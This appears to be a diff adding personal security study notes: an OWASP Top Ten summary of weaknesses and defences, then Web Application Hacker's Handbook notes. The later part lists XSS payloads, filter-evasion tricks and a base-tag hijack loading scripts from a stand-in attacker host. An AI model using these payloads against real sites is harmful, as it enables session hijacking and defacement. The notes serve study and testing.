@@ -1,3 +1,191 @@
+OWASP top ten notes
+----
+injection 
+    - sql injection
+    vulnerable when:
+        - parameterized queries not used
+        - stored procedures
+    prevention:
+        - use safe api that performs parameterized queries
+        - use server side whitelist validation (not a complete defense)
+        - escape special characters
+        - use LIMIT and other SQL controls to prevent mass disclosure in case of SQL injection        
+broken authentication
+    - compromise passwords, keys, session tokens
+    - assume other users identities
+    vulnerable when:
+        - automated attacks are enabled
+        - default and/or weak passwords are enabled
+        - weak credential recovery/forgot password processes
+        - plaintext/encrypted/fast hashed passwords
+        - missing or ineffective multi-factor authentication
+        - exposes session IDs in the URL
+        - does not rotate session IDs after successful login
+        - does not properly invalidate session IDs
+    prevention:
+        - implement multi-factor authentication
+        - do not use default credentials, especially for admins
+        - implement weak-password checks
+        - use suitable password policies (length/complexity/rotation)
+        - ensure registration/recovery/API pathways are hardened against enumeration by provided same error messages for all outcomes
+        - limit/increasingly delay failed login attempts
+            - log all failures
+            - alert admin when attacks are detected
+        - use server-side secure session manager with sufficient entropy
+            - session IDs should not be in the URL
+            - session IDs should be securely stored and invalidated after logout/idle/timeouts        
+sensitive data exposure
+    - inadequate protection of sensitive data
+    vulnerable when:
+        - data transmitted in clear text (HTTP, SMTP, FTP)
+        - data stored in clear text
+        - old/weak crypto algorithms
+        - default keys/weak keys, improper key management/rotation
+        - encryption not enforced
+        - application does not verify server certificate is valid
+    prevention:
+        - classify data processed/stored/transmitted by an application
+            - identify sensitive data according to laws/regulations/business needs
+            - apply controls accordingly
+        - don't store sensitive data when not necessary
+        - encrypt all sensitive data at rest
+        - use up-to-date and standardized algorithms/protocols/key management
+        - encrypt data in transit with TLS with secure parameters
+            - use HSTS
+        - disable caching for responses that contain sensitive data
+        - use strong password hashing 
+        - verify effectiveness of configuration/settings        
+xml external entities
+    - evaluation of external entity references within XML documents
+    vulnerable when:
+        - application accepts XML directly or XML uploads
+        - inserts untrusted data into XML which is parsed by XML processor
+        - XML processor has document type definitions enabled
+        - uses SAML for identity processing 
+        - uses SOAP prior to version 1.2
+        - vulnerability to XXE implies vulnerability to DoS (Billion Laughs attack)
+    prevention:
+        - developer training
+        - use less complex data formats such as JSON
+        - avoid serialization of sensitive data
+        - patch/upgrade all XML processors
+            - use dependency checkers
+        - update SOAP to version >=1.2
+        - disable XML external entity and DTD processing in all XML parsers
+        - server-side whitelisting/filtering/sanitization to prevent hostile data
+        - verify XML/XSL file upload validates incoming XML using XSD validation
+        - SAST tools can help detect XXE
+            - manual code review is best alternative in large applications
+        - virtual patching, API security gateways, web application firewalls        
+broken access control
+    - restrictions on users capabilities not properly enforced
+    vulnerable when:
+        - bypassing access control checks by modifying URL, internal application state, or HTML, or using a custom API attack tool
+        - allowing the primary key to be changed to another users record
+        - Elevation of privilege (perform logged in actions while not logged in, perform admin actions while not admin)
+        - Metadata manipulation such as replaying/tampering with JSON Web Token (JWT) or cookie or hidden field
+        - CORS misconfiguration allows unauthorized API access
+        - Browsing to authenticated pages as unauthenticated user
+        - Accessing API with missing access controls for POST/PUT/DELETE
+    prevention:
+        - except for public resources, deny access by default
+        - implement access control mechanisms only once and re-use them 
+        - model access controls should enforce record ownership, rather than accepting that the user can create, read, update, or delete any record
+        - unique application business limit requirements should be enforced by domain models
+        - disable web server directory listing
+        - ensure file metadata and backup files are not present within web roots
+        - log access control failures, alert admins when appropriate
+        - rate limit API and controller access
+        - JWT tokens should be invalidated server-side after logout        
+security misconfiguration
+    - insecure default configuration
+    - open cloud storage
+    - verbose error messages
+    - all OS, frameworks, libraries must be securely configured and patched 
+    vulnerable when:
+        - missing appropriate security hardening across any of the application stack
+        - improperly configured permissions on cloud services
+        - unnecessary features enabled/installed (ports/services/pages/accounts/privileges)
+        - default accounts enabled and passwords unchanged
+        - error handling reveals stack traces/overly informative
+        - latest security features disabled
+        - security settings misconfigured
+        - server does not send security headers or directives or they are set to insecure values
+        - software is out of data or vulnerable
+    prevention:
+        - repeatable hardening process that makes it fast/easy to deploy another environment that is properly locked down
+        - development/QA/production environments should be identical, with different credentials
+        - minimal platform without unnecessary features
+        - uninstall unused features/frameworks
+        - a task to review/update the configurations appropriate to security notes, updates, and patches as part of the patch management process
+        - review cloud storage permissions
+        - segmented application architecture
+        - sending security directives to clients (Security Headers)
+        - automated process to verify effectiveness of configuration        
+cross site scripting (XSS)
+    - application includes untrusted data in a new web page without proper validation
+    - or updates an existing web page with user supplied data using an API that can create HTML/JavaScript
+    - allows session hijacking, site defacement, redirection to malicious sites
+    vulnerable when:
+        - reflected XSS:
+            - application/API includes unvalidated/unescaped user input as part of HTML output
+            - user interacts with malicious link that points to attacker contolled page
+        - stored XSS:
+            - application/API stores unsanitized user input that is viewed later by another user/admin
+        DOM XSS:
+            - JavaScript frameworks, single-page applications, APIs that dynamically include attacker-controllable data to a page are vulnerable to DOM XSS
+            - application sends attacker-controllable data to unsafe JavaScript APIs
+    prevention:
+        - use frameworks that automatically escape XSS by design
+        - escaping untrusted HTTP request data 
+        - applying context-sensitive encoding when modifying browser document ont he client side
+        - enabling a Content Security Policy (defense-in-depth)
+insecure deserialization
+    - can enable remote code execution
+    vulnerable when:
+        - applications/APIs deserialize hostile/tampered with objects
+    prevention:
+        - don't accept serialized data from untrusted sources
+        - use serialization mediums that only permit primitive data types
+        - use digital signatures
+        - enforce strict type constraints
+        - isolate deserialization code in low privelege environment
+        - log deserialization exceptions/failures
+        - restrict/monitor incoming/outgoing network connectivity from machines that deserialize
+        - monitor deserialization, alerting if a user deserializes constantly
+components with known vulnerabilities
+    vulnerable when:
+        - using components of unknown version
+        - any software is no longer supported/out of data
+        - not scanned for vulnerabilities regularly
+        - untimely fix/upgrade cycle
+        - insufficient compatibility testing
+    prevention:
+        - removed unused dependencies/features/components/files/documentation
+        - continuously inventory the versions of client-side and server-side components
+        - only obtain componenets from official sources over secure links
+            - prefer signed packages
+        - monitor for libraries/components that are unmaintained or do not create security patches for older versions
+insufficient logging and monitoring
+    vulnerable when:
+        - auditable events (logins/failed logins/high-value transactions) not logged
+        - warnings/errors generate no/unclear log messages
+        - logs are not monitored for suspicious activity
+        - logs are only stored locally
+        - appropriate alerting thresholds and response escalation processes are not present or ineffective
+        - penetration testing and scans do not trigger alerts
+        - application is unable to detect/escalate/alert for active attacks in real time
+    prevention:
+        - ensure all login/access control failures/server-side input validation failures can be logged with sufficient user context to identify suspicious/malicious accounts
+        - ensure logs are generated in a format that can be easily consumed
+        - ensure high-value transactions have an audit trail with integrity controls to prevent tampering/deletion (append only)
+        - establish effective monitoring and alerting so suspicious activities are detected/responded to in a timely fashion
+        - establish an incident response + recovery plan
+        
+        
+        
+Web Application Hackers Handbook notes
+----        
 make manual requests for valid and invalid resources
     - pay attention to how the server responds to requests for invalid resources
 use the site map
@@ -123,6 +311,132 @@ account activation urls may be predictable
 for multi-stage authentication, try performing only the final stage
     - may be possible to bypass earlier stages
     
+    
+    
+    
+    
+    
+ways for introducing script code (xss)
+<object data="data:text/html,<script>alert(1)</script>">
+<object data="data:text/htlm;base64, PHNjcmlwdD5hbGVydCgneHNzIHRlc3QnKTwvc2NyaXB0Pg==">
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzIHRlc3QnKTwvc2NyaXB0Pg==">Click here</a>
+
+<xml onreadystatechange=alert(1)>
+<style onreadystatechange=alert(1)>
+<iframe onreadystatechange=alert(1)>
+<object onerror=alert(1)>
+<object type=image src=valid.gic onreadystatechange=alert(1)></object>
+<img type=image src=valid.gif onreadystatechange=alert(1)>
+<script onreadystatechange=alert(1)>
+<bgsound onpropertychange=alert(1)>
+<body onbeforeactivate=alert(1)>
+<body onactivate=alert(1)>
+<body onfocusin=alert(1)>
+
+<input autofocus onfocus=alert(1)>
+<input onblur=alert(1) autofocus><input autofocus>
+<body onscroll=alert(1)><br><br>...<br><input autofocus>
+
+</a onmousemove=alert(1)>
+
+<video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
+
+<object data=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+
+<form id=test /><button form=test formaction=javascript.alert(1)>
+<event-source src=javascript.alert(1)>
+
+<x style=x:expression(alert(1))> # works on IE <7
+<x style=behavior:url(#default#time2) onbegin-alert(1)>
+
+
+Defeating filters
+----
+
+The Tag Name
+----
+
+- Vary the case of the characters
+    <iMg onerror=alert(1) src=a>
+
+- Insert Null bytes
+    <[%00]img onerror=alert(1) src=a>
+    <i[%00]mg onerror=alert(1) src=a>
+    - when submitting to the application, generally use the URL-encoded form of the character
+    
+- Use arbitrary tag names to introduce event handlers
+    <x onclick=alert(1) src=a>Click here</x>
+    
+- Base tag Hijacking
+    - <base> tag indicates base url that relative URLs load from
+    - if you can introduce a new <base> tag and the page performs any <script> includes after the reflection point using relative URLs, you can specify a base URL to a server you control
+        - When the browser loads the scripts specified in the remainder of the HTML page, they are loaded from the specified server
+    <base href="http://mdattacker.net/badscripts/">
+    ...
+    <script src="goodscript.js"></script>
+    <base> tags *should* appear within the <head> section, but may work elsewhere
+    
+- Space following the tag name    
+    - Several characters can replace the space between tag name and first attribute name
+    <img/onerror=alert(1) src=a>
+    <img[%09]onerror=alert(1) src=a>
+    <img[%0d]onerror=alert(1) src=a>
+    <img[%0a]onerror=alert(1) src=a>
+    <img/"onerror=alert(1) src=a>
+    <img/'onerror=alert(1) src=a>
+    <img/anyjunk/onerror=alert(1) src=a>
+    
+Always add superfluous content after the tag name
+    <script/anyjunk>alert(1)</script>
+    
+Attribute Names
+----
+
+Null bytes (again)
+    <img o[%00]neerror=alert(1) src=a>
+    
+Attribute delimiters
+    Attributes can be delimited with double or single quotes, or backticks on IE
+    <img onerror="alert(1)"src=a>
+    <img onerror='alert(1)'src=a>
+    <img onerror=`alert(1)`src=a> # IE
+    
+Combining quote-delimited attributes with unexpected characters following the tag name can defeat simple filters    
+    <img/onerror="alert(1)"src=a>
+        
+Attribute Values
+----    
+Null bytes + HTML encode characters within the value
+    <img onerror=a[%00]lert(1) src=a>
+    <img onerror=a&#x6c;ert(1) src=a>
+
+HTML encoding
+    <iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29;>
+    
+    Use both decimal + hexadecimal format, add leading zeros, and omit trailing semicolon
+    <img onerror=a&#x06c;ert(1) src=a>
+    <img onerror=a&#x006c;ert(1) src=a>
+    <img onerror=a&#x0006c;ert(1) src=a>
+    <img onerror=a&#108;ert(1) src=a>
+    <img onerror=a&#0108;ert(1) src=a>
+    <img onerror=a&#108ert(1) src=a>
+    <img onerror=a&#0108ert(1) src=a>
+    
+<<script>alert(1);//<</script>
+<script<{alert(1)}/></script>    
+
+Character Sets
+----
+Alternative encodings
+    Make the browser interpret the response using the specified character set
+    Control the Content-Type header or corresponding HTML metatag may enable use of nonstandard character sets
+    `charset` parameter may actually be submitted, which allows directly setting the character set
+    
+    - US-ASCII
+    %script%alert(docurrent.cookie)%/script%
     
     
     
